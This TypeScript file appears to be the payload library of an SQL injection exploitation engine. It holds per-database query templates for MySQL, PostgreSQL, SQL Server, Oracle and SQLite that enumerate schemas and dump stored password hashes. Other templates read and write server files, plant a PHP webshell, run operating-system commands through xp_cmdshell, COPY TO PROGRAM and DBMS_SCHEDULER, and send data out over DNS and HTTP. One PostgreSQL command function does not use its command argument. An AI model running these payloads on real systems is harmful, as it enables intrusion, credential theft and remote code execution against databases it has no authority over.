/**
 * SOHE God Rail v3 — DBMS Query Library
 *
 * Complete per-DBMS query reference used by the ExploitationEngine
 * to generate syntactically correct queries at each depth level (L9–L16).
 *
 * Every query is a pure function: takes context params, returns a SQL fragment.
 * The ExploitationEngine wraps these in the appropriate injection channel
 * (UNION column slot, error function, boolean condition, etc.).
 */

import { DbmsType } from '../../types/sqlScanner';

// ─── Core Query Interface ──────────────────────────────────────────

export interface DbmsQuerySet {
  readonly dbmsType: DbmsType;

  // L5: Identification
  version: string;
  currentUser: string;
  currentDb: string;
  hostname: string;
  serverOs: string;

  // L9: Schema Enumeration
  allDatabases: string;
  allTables: (db: string) => string;
  allColumns: (db: string, table: string) => string;
  tableCount: (db: string) => string;
  rowCount: (db: string, table: string) => string;

  // L12: Data Extraction Helpers
  concat: (columns: string[]) => string;
  concatRows: (expression: string, separator?: string) => string;
  substring: (str: string, pos: number, len: number) => string;
  ascii: (char: string) => string;
  charFunc: (code: number) => string;
  length: (str: string) => string;
  castToString: (expr: string) => string;

  // L13: Privilege Checks
  isDba: string;
  filePrivilege: string;
  currentPrivileges: string;

  // L14: Credential Extraction
  credentials: string;

  // L15: File I/O
  readFile: (path: string) => string;
  writeFile: (data: string, path: string) => string;

  // L16: OS Command Execution
  osCommand: (cmd: string) => string;
  alternativeOsCommand: (cmd: string) => string;

  // Timing & Conditionals
  sleep: (seconds: number) => string;
  conditional: (cond: string, ifTrue: string, ifFalse: string) => string;
  benchmarkHeavy: (iterations: number) => string;

  // Error-Based Extraction Functions
  errorExtract: {
    primary: (subquery: string) => string;
    secondary: (subquery: string) => string;
    tertiary?: (subquery: string) => string;
  };

  // OOB Exfiltration
  oobDns: (data: string, domain: string) => string;
  oobHttp?: (data: string, url: string) => string;

  // Syntax
  commentSingle: string;
  commentMulti: [string, string];
  stringConcatOp: string;
  nullValue: string;
}

// ─── MySQL / MariaDB ───────────────────────────────────────────────

const MYSQL_QUERIES: DbmsQuerySet = {
  dbmsType: 'MySQL',

  // L5: Identification
  version: 'SELECT @@version',
  currentUser: 'SELECT current_user()',
  currentDb: 'SELECT database()',
  hostname: 'SELECT @@hostname',
  serverOs: 'SELECT @@version_compile_os',

  // L9: Schema Enumeration
  allDatabases: "SELECT GROUP_CONCAT(schema_name SEPARATOR 0x0a) FROM information_schema.schemata",
  allTables: (db) =>
    `SELECT GROUP_CONCAT(table_name SEPARATOR 0x0a) FROM information_schema.tables WHERE table_schema='${db}'`,
  allColumns: (db, table) =>
    `SELECT GROUP_CONCAT(column_name,0x3a,data_type SEPARATOR 0x0a) FROM information_schema.columns WHERE table_schema='${db}' AND table_name='${table}'`,
  tableCount: (db) =>
    `SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='${db}'`,
  rowCount: (db, table) =>
    `SELECT COUNT(*) FROM ${db}.${table}`,

  // L12: Data Extraction Helpers
  concat: (cols) => `CONCAT(${cols.join(",0x3a,")})`,
  concatRows: (expr, _sep = '\\n') =>
    `GROUP_CONCAT(${expr} SEPARATOR 0x0a)`,
  substring: (str, pos, len) => `SUBSTRING(${str},${pos},${len})`,
  ascii: (char) => `ASCII(${char})`,
  charFunc: (code) => `CHAR(${code})`,
  length: (str) => `LENGTH(${str})`,
  castToString: (expr) => `CAST(${expr} AS CHAR)`,

  // L13: Privilege Checks
  isDba: "SELECT super_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(current_user(),'@',1) LIMIT 1",
  filePrivilege: "SELECT file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(current_user(),'@',1) LIMIT 1",
  currentPrivileges: "SELECT GROUP_CONCAT(PRIVILEGE_TYPE SEPARATOR ',') FROM information_schema.user_privileges WHERE GRANTEE=CONCAT(\"'\",SUBSTRING_INDEX(current_user(),'@',1),\"'@'\",SUBSTRING_INDEX(current_user(),'@',-1),\"'\")",

  // L14: Credential Extraction
  credentials: "SELECT GROUP_CONCAT(user,0x3a,authentication_string SEPARATOR 0x0a) FROM mysql.user",

  // L15: File I/O
  readFile: (path) => `SELECT LOAD_FILE('${path}')`,
  writeFile: (data, path) => `SELECT '${data}' INTO OUTFILE '${path}'`,

  // L16: OS Command Execution
  osCommand: (cmd) =>
    // Requires lib_mysqludf_sys: CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so'
    `SELECT sys_exec('${cmd}')`,
  alternativeOsCommand: (cmd) =>
    // Via webshell write + HTTP request
    `SELECT '<?php echo shell_exec("${cmd}");?>' INTO OUTFILE '/var/www/html/_sentinel_shell.php'`,

  // Timing & Conditionals
  sleep: (s) => `SLEEP(${s})`,
  conditional: (cond, t, f) => `IF(${cond},${t},${f})`,
  benchmarkHeavy: (n) => `BENCHMARK(${n},SHA2('sentinel',512))`,

  // Error-Based Extraction
  errorExtract: {
    primary: (sq) => `AND EXTRACTVALUE(1,CONCAT(0x7e,(${sq})))`,
    secondary: (sq) => `AND UPDATEXML(1,CONCAT(0x7e,(${sq})),1)`,
    tertiary: (sq) =>
      `AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((${sq}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`,
  },

  // OOB Exfiltration
  oobDns: (data, domain) =>
    `SELECT LOAD_FILE(CONCAT('\\\\\\\\',${data},'.${domain}\\\\a'))`,

  // Syntax
  commentSingle: '-- ',
  commentMulti: ['/*', '*/'],
  stringConcatOp: '',
  nullValue: 'NULL',
};

// ─── PostgreSQL ────────────────────────────────────────────────────

const POSTGRESQL_QUERIES: DbmsQuerySet = {
  dbmsType: 'PostgreSQL',

  version: 'SELECT version()',
  currentUser: 'SELECT current_user',
  currentDb: 'SELECT current_database()',
  hostname: 'SELECT inet_server_addr()',
  serverOs: "SELECT setting FROM pg_settings WHERE name='server_version'",

  allDatabases: "SELECT string_agg(datname,chr(10)) FROM pg_database WHERE datistemplate=false",
  allTables: (_db) =>
    `SELECT string_agg(tablename,chr(10)) FROM pg_tables WHERE schemaname='public'`,
  allColumns: (_db, table) =>
    `SELECT string_agg(column_name||':'||data_type,chr(10)) FROM information_schema.columns WHERE table_schema='public' AND table_name='${table}'`,
  tableCount: (_db) =>
    `SELECT COUNT(*) FROM pg_tables WHERE schemaname='public'`,
  rowCount: (_db, table) =>
    `SELECT COUNT(*) FROM ${table}`,

  concat: (cols) => cols.join("||':'||"),
  concatRows: (expr) => `string_agg(${expr},chr(10))`,
  substring: (str, pos, len) => `SUBSTRING(${str} FROM ${pos} FOR ${len})`,
  ascii: (char) => `ASCII(${char})`,
  charFunc: (code) => `CHR(${code})`,
  length: (str) => `LENGTH(${str})`,
  castToString: (expr) => `CAST(${expr} AS TEXT)`,

  isDba: "SELECT CASE WHEN usesuper THEN 'Y' ELSE 'N' END FROM pg_user WHERE usename=current_user",
  filePrivilege: "SELECT CASE WHEN usesuper THEN 'Y' ELSE 'N' END FROM pg_user WHERE usename=current_user",
  currentPrivileges: "SELECT string_agg(rolname,',') FROM pg_roles WHERE pg_has_role(current_user,oid,'member')",

  credentials: "SELECT string_agg(usename||':'||COALESCE(passwd,'NO_PASS'),chr(10)) FROM pg_shadow",

  readFile: (path) => `SELECT pg_read_file('${path}')`,
  writeFile: (data, path) => `COPY (SELECT '${data}') TO '${path}'`,

  osCommand: (cmd) => `COPY (SELECT '') TO PROGRAM '${cmd}'`,
  alternativeOsCommand: (cmd) =>
    // Via PL/pgSQL
    `CREATE OR REPLACE FUNCTION _sentinel_exec(text) RETURNS text AS $$BEGIN RETURN (SELECT pg_read_file('/proc/self/cmdline'));END;$$ LANGUAGE plpgsql;SELECT _sentinel_exec('${cmd}')`,

  sleep: (s) => `pg_sleep(${s})`,
  conditional: (cond, t, f) => `CASE WHEN (${cond}) THEN ${t} ELSE ${f} END`,
  benchmarkHeavy: (n) => `generate_series(1,${n})`,

  errorExtract: {
    primary: (sq) => `AND 1=CAST((${sq}) AS INT)`,
    secondary: (sq) => `AND 1=(${sq})::int`,
  },

  oobDns: (data, domain) =>
    `COPY (SELECT '') TO PROGRAM 'nslookup '||(${data})||'.${domain}'`,
  oobHttp: (data, url) =>
    `COPY (SELECT '') TO PROGRAM 'curl ${url}/'||(${data})`,

  commentSingle: '-- ',
  commentMulti: ['/*', '*/'],
  stringConcatOp: '||',
  nullValue: 'NULL',
};

// ─── Microsoft SQL Server ──────────────────────────────────────────

const MSSQL_QUERIES: DbmsQuerySet = {
  dbmsType: 'Microsoft SQL Server',

  version: 'SELECT @@version',
  currentUser: 'SELECT SYSTEM_USER',
  currentDb: 'SELECT DB_NAME()',
  hostname: 'SELECT @@SERVERNAME',
  serverOs: 'SELECT host_platform FROM sys.dm_os_host_info',

  allDatabases: "SELECT STRING_AGG(name,CHAR(10)) FROM master.sys.databases",
  allTables: (db) =>
    `SELECT STRING_AGG(table_name,CHAR(10)) FROM ${db}.information_schema.tables WHERE table_type='BASE TABLE'`,
  allColumns: (db, table) =>
    `SELECT STRING_AGG(column_name+':'+data_type,CHAR(10)) FROM ${db}.information_schema.columns WHERE table_name='${table}'`,
  tableCount: (db) =>
    `SELECT COUNT(*) FROM ${db}.information_schema.tables WHERE table_type='BASE TABLE'`,
  rowCount: (db, table) =>
    `SELECT COUNT(*) FROM ${db}.dbo.${table}`,

  concat: (cols) => cols.join("+':'+"),
  concatRows: (expr) => `STRING_AGG(${expr},CHAR(10))`,
  substring: (str, pos, len) => `SUBSTRING(${str},${pos},${len})`,
  ascii: (char) => `ASCII(${char})`,
  charFunc: (code) => `CHAR(${code})`,
  length: (str) => `LEN(${str})`,
  castToString: (expr) => `CAST(${expr} AS NVARCHAR(MAX))`,

  isDba: "SELECT IS_SRVROLEMEMBER('sysadmin')",
  filePrivilege: "SELECT HAS_PERMS_BY_NAME(null,null,'ADMINISTER BULK OPERATIONS')",
  currentPrivileges: "SELECT STRING_AGG(permission_name,',') FROM fn_my_permissions(NULL,'SERVER')",

  credentials: "SELECT STRING_AGG(name+':'+CONVERT(VARCHAR(MAX),password_hash,1),CHAR(10)) FROM sys.sql_logins",

  readFile: (path) =>
    `SELECT BulkColumn FROM OPENROWSET(BULK '${path}',SINGLE_CLOB) AS x`,
  writeFile: (data, path) =>
    `EXEC xp_cmdshell 'echo ${data} > ${path}'`,

  osCommand: (cmd) => `EXEC xp_cmdshell '${cmd}'`,
  alternativeOsCommand: (cmd) =>
    `DECLARE @o INT;EXEC sp_OACreate 'WScript.Shell',@o OUT;EXEC sp_OAMethod @o,'Run',NULL,'cmd.exe /c ${cmd}'`,

  sleep: (s) => `WAITFOR DELAY '0:0:${s}'`,
  conditional: (cond, t, f) => `CASE WHEN (${cond}) THEN ${t} ELSE ${f} END`,
  benchmarkHeavy: (n) =>
    `DECLARE @i INT=0;WHILE @i<${n} BEGIN SET @i=@i+1;SELECT HASHBYTES('SHA2_512','a');END`,

  errorExtract: {
    primary: (sq) => `AND 1=CONVERT(INT,(${sq}))`,
    secondary: (sq) => `AND 1=(SELECT CAST((${sq}) AS INT))`,
  },

  oobDns: (data, domain) =>
    `EXEC master..xp_dirtree '\\\\'+(${data})+'.${domain}\\a'`,
  oobHttp: (data, url) =>
    `EXEC xp_cmdshell 'curl ${url}/'+(${data})`,

  commentSingle: '-- ',
  commentMulti: ['/*', '*/'],
  stringConcatOp: '+',
  nullValue: 'NULL',
};

// ─── Oracle ────────────────────────────────────────────────────────

const ORACLE_QUERIES: DbmsQuerySet = {
  dbmsType: 'Oracle',

  version: 'SELECT banner FROM v$version WHERE ROWNUM=1',
  currentUser: 'SELECT USER FROM dual',
  currentDb: 'SELECT ora_database_name FROM dual',
  hostname: 'SELECT UTL_INADDR.GET_HOST_NAME FROM dual',
  serverOs: 'SELECT DBMS_UTILITY.PORT_STRING FROM dual',

  allDatabases: "SELECT LISTAGG(username,CHR(10)) WITHIN GROUP(ORDER BY username) FROM all_users",
  allTables: (db) =>
    `SELECT LISTAGG(table_name,CHR(10)) WITHIN GROUP(ORDER BY table_name) FROM all_tables WHERE owner=UPPER('${db}')`,
  allColumns: (db, table) =>
    `SELECT LISTAGG(column_name||':'||data_type,CHR(10)) WITHIN GROUP(ORDER BY column_id) FROM all_tab_columns WHERE owner=UPPER('${db}') AND table_name=UPPER('${table}')`,
  tableCount: (db) =>
    `SELECT COUNT(*) FROM all_tables WHERE owner=UPPER('${db}')`,
  rowCount: (db, table) =>
    `SELECT COUNT(*) FROM ${db}.${table}`,

  concat: (cols) => cols.join("||':'||"),
  concatRows: (expr) => `LISTAGG(${expr},CHR(10)) WITHIN GROUP(ORDER BY 1)`,
  substring: (str, pos, len) => `SUBSTR(${str},${pos},${len})`,
  ascii: (char) => `ASCII(${char})`,
  charFunc: (code) => `CHR(${code})`,
  length: (str) => `LENGTH(${str})`,
  castToString: (expr) => `TO_CHAR(${expr})`,

  isDba: "SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE=USER AND GRANTED_ROLE='DBA'",
  filePrivilege: "SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE=USER AND GRANTED_ROLE='DBA'",
  currentPrivileges: "SELECT LISTAGG(PRIVILEGE,',') WITHIN GROUP(ORDER BY PRIVILEGE) FROM SESSION_PRIVS",

  credentials: "SELECT LISTAGG(username||':'||password,CHR(10)) WITHIN GROUP(ORDER BY username) FROM dba_users",

  readFile: (path) =>
    `SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('DIRECTORY_NAME','${path}','R')) FROM dual`,
  writeFile: (data, path) =>
    `DECLARE f UTL_FILE.FILE_TYPE;BEGIN f:=UTL_FILE.FOPEN('DIRECTORY_NAME','${path}','W');UTL_FILE.PUT_LINE(f,'${data}');UTL_FILE.FCLOSE(f);END;`,

  osCommand: (cmd) =>
    `BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'_sentinel_job',job_type=>'EXECUTABLE',job_action=>'/bin/sh',number_of_arguments=>2,auto_drop=>TRUE);DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('_sentinel_job',1,'-c');DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('_sentinel_job',2,'${cmd}');DBMS_SCHEDULER.RUN_JOB('_sentinel_job');END;`,
  alternativeOsCommand: (cmd) =>
    // Java-based execution (requires JAVA privilege)
    `SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/sh -c ${cmd}') FROM dual`,

  sleep: (s) => `DBMS_LOCK.SLEEP(${s})`,
  conditional: (cond, t, f) => `CASE WHEN (${cond}) THEN ${t} ELSE ${f} END`,
  benchmarkHeavy: (n) => `DBMS_PIPE.RECEIVE_MESSAGE('sentinel',${n})`,

  errorExtract: {
    primary: (sq) => `AND 1=CTXSYS.DRITHSX.SN(1,(${sq}))`,
    secondary: (sq) => `AND 1=UTL_INADDR.GET_HOST_ADDRESS((${sq}))`,
  },

  oobDns: (data, domain) =>
    `SELECT UTL_INADDR.GET_HOST_ADDRESS((${data})||'.${domain}') FROM dual`,
  oobHttp: (data, url) =>
    `SELECT UTL_HTTP.REQUEST('${url}/'||(${data})) FROM dual`,

  commentSingle: '-- ',
  commentMulti: ['/*', '*/'],
  stringConcatOp: '||',
  nullValue: 'NULL',
};

// ─── SQLite ────────────────────────────────────────────────────────

const SQLITE_QUERIES: DbmsQuerySet = {
  dbmsType: 'SQLite',

  version: 'SELECT sqlite_version()',
  currentUser: "SELECT 'sqlite_user'",
  currentDb: "SELECT 'main'",
  hostname: "SELECT 'localhost'",
  serverOs: "SELECT 'unknown'",

  allDatabases: "SELECT GROUP_CONCAT(name,CHAR(10)) FROM pragma_database_list",
  allTables: (_db) =>
    `SELECT GROUP_CONCAT(name,CHAR(10)) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'`,
  allColumns: (_db, table) =>
    `SELECT GROUP_CONCAT(name||':'||type,CHAR(10)) FROM pragma_table_info('${table}')`,
  tableCount: (_db) =>
    `SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'`,
  rowCount: (_db, table) =>
    `SELECT COUNT(*) FROM ${table}`,

  concat: (cols) => cols.join("||':'||"),
  concatRows: (expr) => `GROUP_CONCAT(${expr},CHAR(10))`,
  substring: (str, pos, len) => `SUBSTR(${str},${pos},${len})`,
  ascii: (char) => `UNICODE(${char})`,
  charFunc: (code) => `CHAR(${code})`,
  length: (str) => `LENGTH(${str})`,
  castToString: (expr) => `CAST(${expr} AS TEXT)`,

  isDba: "SELECT 'N'",
  filePrivilege: "SELECT 'N'",
  currentPrivileges: "SELECT 'ALL'",

  credentials: "SELECT 'no_auth_table'",

  readFile: (path) => `SELECT READFILE('${path}')`,
  writeFile: (data, path) => `SELECT WRITEFILE('${path}','${data}')`,

  osCommand: (_cmd) => "SELECT 'not_supported'",
  alternativeOsCommand: (_cmd) => "SELECT 'not_supported'",

  sleep: (s) =>
    // SQLite has no native SLEEP — use heavy computation
    `(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${s * 100000})))))`   ,
  conditional: (cond, t, f) => `CASE WHEN (${cond}) THEN ${t} ELSE ${f} END`,
  benchmarkHeavy: (n) => `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${n}))))`,

  errorExtract: {
    primary: (_sq) => `-- SQLite error extraction limited`,
    secondary: (_sq) => `-- SQLite error extraction limited`,
  },

  oobDns: (_data, _domain) => "SELECT 'oob_not_supported_sqlite'",

  commentSingle: '-- ',
  commentMulti: ['/*', '*/'],
  stringConcatOp: '||',
  nullValue: 'NULL',
};

// ─── Registry & Accessor ──────────────────────────────────────────

const QUERY_REGISTRY: Record<string, DbmsQuerySet> = {
  MySQL: MYSQL_QUERIES,
  MariaDB: { ...MYSQL_QUERIES, dbmsType: 'MariaDB' },
  'Microsoft SQL Server': MSSQL_QUERIES,
  PostgreSQL: POSTGRESQL_QUERIES,
  Oracle: ORACLE_QUERIES,
  SQLite: SQLITE_QUERIES,
  'Generic SQL': MYSQL_QUERIES,
  Unknown: MYSQL_QUERIES,
};

export class DbmsQueryLibrary {
  /**
   * Returns the full query set for a given DBMS type.
   * Defaults to MySQL if DBMS is unknown (most common in the wild).
   */
  static get(dbms: DbmsType): DbmsQuerySet {
    return QUERY_REGISTRY[dbms] || MYSQL_QUERIES;
  }

  /**
   * Returns all supported DBMS types.
   */
  static supportedDbms(): DbmsType[] {
    return Object.keys(QUERY_REGISTRY) as DbmsType[];
  }
}
